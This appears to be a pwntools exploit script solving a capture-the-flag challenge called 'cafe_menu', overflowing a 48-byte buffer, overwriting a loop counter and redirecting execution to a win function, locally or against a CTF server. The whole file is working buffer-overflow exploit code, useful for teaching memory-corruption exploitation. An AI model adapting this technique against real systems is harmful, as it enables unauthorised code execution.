#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./cafe_menu', checksec=False)

def conn():
    if args.LOCAL: 
        r = process([elf.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote('offsec.m0lecon.it',13509)
    return r

def main():
    p = conn()
    OFF = 48 #buffer's size
    JUMP = 64 #offset -1 : 65-1, because it will be incremented by 1 next cycle
    win_addr = 0x00401262
    
    #exploit
    ret = p.recvuntil(b'finish):\n')
    print(ret)
    payload = b'A'*OFF + p64(JUMP) + p64(win_addr) + b'\xff'
    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    main()
